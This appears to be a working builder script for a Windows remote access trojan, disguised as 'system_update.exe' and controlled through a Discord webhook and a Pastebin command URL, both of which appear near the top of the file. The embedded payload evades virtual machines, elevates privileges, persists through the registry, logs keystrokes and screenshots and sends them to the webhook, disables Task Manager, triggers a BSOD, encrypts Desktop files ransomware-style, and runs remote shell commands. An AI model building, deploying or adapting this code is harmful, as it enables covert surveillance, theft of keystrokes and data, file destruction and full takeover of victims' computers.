pip install requests pillow pynput opencv-python cryptography pywin32 pyinstaller pyperclip pynput

https://discord.com/api/webhooks/1453461921733939202/NpZz8x6PQZsh9GmJUIpPT4hK12PJEOm8V0y23nRTtBBbvdk_5c4iin076WJK3srQN2Px

https://pastebin.com/raw/m5U6eger




import os
import subprocess
import shutil

webhook_url = input("Paste your Discord webhook URL here: ").strip()
command_url = input("Paste your Pastebin raw URL here: ").strip()
output_name = "system_update.exe"

rat_code = f'''
import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import winreg

WEBHOOK_URL = "{webhook_url}"
COMMAND_URL = "{command_url}"
POLL_INTERVAL = 15
VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
KEYLOG_BUFFER = ""

def send(msg="", embed=None, file=None):
    data = {{"content": msg}}
    if embed: data["embeds"] = [embed]
    files = {{"file": file}} if file else None
    try: requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
    except: pass

def info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "Unknown"
    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {{VICTIM_ID}}\\n**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
    send(embed=embed)

def anti_vm():
    try:
        if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in ["virtual", "vmware", "vbox"]):
            sys.exit(0)
    except: pass

def elevate():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except: pass

def on_press(key):
    global KEYLOG_BUFFER
    try:
        KEYLOG_BUFFER += key.char
    except AttributeError:
        if key == Key.space: KEYLOG_BUFFER += " "
        elif key == Key.enter: KEYLOG_BUFFER += "\\n"
        else: KEYLOG_BUFFER += f" [{{key}}] "
    if len(KEYLOG_BUFFER) > 500:
        send(f"Keylog {{VICTIM_ID}}:\\n{{KEYLOG_BUFFER[-500:]}}")
        KEYLOG_BUFFER = ""

def screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    send(f"{{VICTIM_ID}} screenshot", file=("ss.png", buf, "image/png"))

def lock_pc():
    ctypes.windll.user32.LockWorkStation()
    send(f"{{VICTIM_ID}} locked.")

def toggle_tm(enable=True):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
        winreg.CloseKey(key)
        send(f"Task Manager {{'enabled' if enable else 'disabled'}} on {{VICTIM_ID}}")
    except: pass

def bsod():
    send(f"BSOD triggered on {{VICTIM_ID}}")
    enabled = ctypes.c_bool()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(enabled))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def encrypt(path=os.path.expanduser("~\\Desktop")):
    key = Fernet.generate_key()
    f = Fernet(key)
    send(f"KEY {{VICTIM_ID}}: {{key.decode()}} - SAVE IT")
    count = 0
    exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(exts):
                fp = os.path.join(root, file)
                try:
                    with open(fp, "rb") as data: encrypted = f.encrypt(data.read())
                    with open(fp + ".locked", "wb") as out: out.write(encrypted)
                    os.remove(fp)
                    count += 1
                except: pass
    send(f"Encrypted {{count}} files on {{VICTIM_ID}}")

def shell(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e: out = str(e)
    send(f"Shell {{VICTIM_ID}}:\\n{{out[:3000]}}")

def poll():
    while True:
        try:
            cmds = requests.get(COMMAND_URL, timeout=10).json()
            if str(VICTIM_ID) in cmds:
                full = cmds[str(VICTIM_ID)].strip()
                parts = full.split(" ", 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                send(f"Running: {{full}}")
                if cmd in ["ss", "screenshot"]: screenshot()
                elif cmd == "lock": lock_pc()
                elif cmd == "disabletm": toggle_tm(False)
                elif cmd == "enabletm": toggle_tm(True)
                elif cmd == "bsod": bsod()
                elif cmd == "encrypt": encrypt(arg or None)
                elif cmd == "shell": shell(arg)
        except: pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    anti_vm()
    elevate()
    persist()
    info()
    with Listener(on_press=on_press) as listener:
        threading.Thread(target=poll, daemon=True).start()
        listener.join()
'''

with open("rat.py", "w", encoding="utf-8") as f: 
    f.write(rat_code)

print("Building with pynput fix - hold tight...")
subprocess.run([
    "pyinstaller",
    "--onefile",
    "--noconsole",
    "--hidden-import=pynput.keyboard._win32",
    "--hidden-import=pynput._util.win32",
    "--name", output_name,
    "rat.py"
])

# Cleanup
shutil.rmtree("build", ignore_errors=True)
shutil.rmtree("__pycache__", ignore_errors=True)
os.remove("rat.py") if os.path.exists("rat.py") else None
os.remove("rat.spec") if os.path.exists("rat.spec") else None

print(f"Done - pynput error annihilated. EXE at dist\\{output_name}")
print("Keylogger now buffers and exfils real keystrokes.")
